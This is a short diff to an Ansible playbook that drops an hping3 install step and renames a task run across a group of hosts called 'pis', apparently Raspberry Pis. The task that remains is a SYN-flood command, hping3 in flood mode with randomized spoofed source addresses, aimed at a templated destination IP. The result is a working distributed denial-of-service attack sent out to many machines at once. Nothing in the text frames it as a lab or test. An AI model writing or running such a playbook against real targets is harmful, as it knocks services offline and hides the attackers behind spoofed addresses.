@@ -1,9 +1,5 @@
 ---
 - hosts: pis
   tasks:
-    - name: Install hping3
-      apt:
-        name: hping3
-        state: present
-    - name: Run syn-DOS
+    - name: Run SYN-Flood
       shell: hping3 -S -P -U --flood -V --rand-source {{DST_IP}}
